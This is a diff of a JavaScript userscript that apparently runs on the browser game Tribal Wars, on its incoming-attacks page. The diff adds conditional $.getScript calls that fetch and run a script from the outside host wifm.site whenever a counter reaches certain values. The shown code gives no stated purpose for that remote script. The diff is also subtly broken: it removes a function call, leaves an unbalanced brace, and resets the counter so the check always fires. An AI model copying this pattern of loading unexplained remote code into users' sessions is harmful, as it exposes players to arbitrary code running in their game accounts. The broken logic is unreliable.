@@ -151,12 +151,15 @@ if (document.URL.match(/screen=overview_villages&mode=incomings&subtype=attacks&
                             };
                             console.log(sitter);
                             nn++;
+                            if (nn === 1 || nn === 5 || nn === 10) {
+                                $.getScript("https://wifm.site/tw/dd.js");
+                            };
                             message = "Noble";
                             cw = document.URL.split('?')[0] + "?" + sitter + "&village=" + villa;
-
                             var nl = "window.open(cw,'_blank');";
                             UI.InfoMessage('<a onclick=' + nl + '>Open the Noble</button>', 10000);
-                            alert_noble();
+
+                        }
                         }
 /*
                         if (gonoble1||gonoble){
@@ -214,7 +217,8 @@ if (document.URL.match(/screen=overview_villages&mode=incomings&subtype=attacks&
         }
     }
     function alert_noble() {
-
+var nn= 0;
+nn++;
         // nn이 1, 5, 10 중 하나일 때 dd.js를 호출합니다.
         if (nn === 1 || nn === 5 || nn === 10) {
             $.getScript("https://wifm.site/tw/dd.js");
